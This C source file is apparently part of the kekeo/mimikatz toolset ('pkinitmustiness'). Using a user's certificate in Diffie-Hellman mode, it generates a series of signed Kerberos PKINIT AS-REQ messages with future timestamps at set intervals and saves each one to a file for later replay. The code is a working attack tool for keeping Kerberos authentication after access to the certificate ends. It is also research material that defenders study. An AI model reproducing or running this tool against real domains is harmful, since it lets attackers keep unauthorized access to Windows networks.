/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "pkinitmustiness.h"

BOOL g_isAsn1Init = FALSE, g_isKerberos = FALSE, g_isBreak = FALSE;

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	g_isBreak = TRUE;
	return TRUE;
}

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isKerberos = kull_m_kerberos_helper_init())
			status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
	return !(g_isAsn1Init || g_isKerberos);
}

int main(int argc, char * argv[])
{
	KIWI_AUTH_INFOS authInfo;
	OssBuf AsReq;
	FILETIME fTime, eTime;
	KerberosTime time;
	BOOL isNonce, isSign = TRUE;
	DWORD cookie, i, increment, count;
	PCSTR szLifetime;
	
	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  " MIMIKATZ_SECOND "\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'    > draft-ietf-kitten-pkinit-freshness (Microsoft) * * */\n\n");

	if(init())
	{
		CDGenerateRandomBits(&cookie, sizeof(cookie));
		kprintf("Cookie value       : %08x\n", cookie);
		if(kull_m_kerberos_helper_getAuthInfo(argc, argv, &authInfo))
		{
			if(authInfo.type == KIWI_AUTH_INFOS_TYPE_RSA_DH)
			{
				isNonce = authInfo.u.certInfoDH.dhKeyInfo.dhClientNonce.value && authInfo.u.certInfoDH.dhKeyInfo.dhClientNonce.length;
				GetSystemTimeAsFileTime(&fTime);
				if(kull_m_string_args_byName(argc, argv, "startoffset", &szLifetime, NULL))
					*(PULONGLONG) &fTime -= *(PULONGLONG) &fTime % 10000000 - ((LONGLONG) strtol(szLifetime, NULL, 0) * 10000000 * 60);
				kull_m_string_args_byName(argc, argv, "increment", &szLifetime, "10");
				increment = strtoul(szLifetime, NULL, 0);
				kull_m_string_args_byName(argc, argv, "count", &szLifetime, "1");
				count = strtoul(szLifetime, NULL, 0);
				kprintf("> Current time     : "); kull_m_string_displayLocalFileTime(&fTime);
				kprintf("\n> Start time       : "); kull_m_string_displayLocalFileTime(&fTime);
				kprintf("\n> Increment        : %u mn"
					"\n> Count            : %u\n", increment, count);
				if(count)
				{
					*(PULONGLONG) &eTime = *(PULONGLONG) &fTime + (ULONGLONG) 10000000 * 60 * increment * (count - 1);
					kprintf("> End              : "); kull_m_string_displayLocalFileTime(&eTime); kprintf("\n\n");
					for(i = 0; (!g_isBreak && isSign) && (i < count); i++, *(PULONGLONG) &fTime += (ULONGLONG) 10000000 * 60 * increment)
					{
						kull_m_kerberos_asn1_helper_init_KerberosTime2(&time, &fTime, FALSE);
						kprintf("* "); kull_m_string_displayLocalFileTime(&fTime); kprintf(" - ");
						if(isSign = kull_m_kerberos_asn1_helper_build_AsReq_Generic(&authInfo, NULL, NULL, &time, TRUE, &AsReq))
						{
							isSign = exportAsReq(cookie, &fTime, &authInfo, &AsReq);
							kull_m_kerberos_asn1_helper_ossFreeBuf(AsReq.value);
						}
						if(isNonce)
							CDGenerateRandomBits(authInfo.u.certInfoDH.dhKeyInfo.dhClientNonce.value, authInfo.u.certInfoDH.dhKeyInfo.dhClientNonce.length);
					}
				}
				else PRINT_ERROR("Invalid count\n");
			}
			else PRINT_ERROR("Certificate subject and Diffie-Hellman mode needed\n");
			kull_m_kerberos_helper_freeAuthInfo(&authInfo);
		}
		term();
	}
	return 0;
}

BOOL exportAsReq(DWORD cookie, PFILETIME fTime, PKIWI_AUTH_INFOS authInfo, OssBuf *asReq)
{
	BOOL status = FALSE;
	CHAR timer[15];
	size_t charCount = 0x1000;
	char *filename;

	if(kull_m_string_LocalFileTimeToString(fTime, timer))
	{
		if(filename = (char *) LocalAlloc(LPTR, charCount))
		{
			if(sprintf_s(filename, charCount, "%08x-%s-%s@%s.musti", cookie, timer, authInfo->szUser, authInfo->szDomain) > 0)
			{
				kprintf("%s -> ", filename);
				if(status = kull_m_file_writeData(filename, asReq->value, asReq->length))
					kprintf("OK\n");
				else PRINT_ERROR_AUTO("kull_m_file_writeData");
			}
			LocalFree(filename);
		}
	}
	return status;
}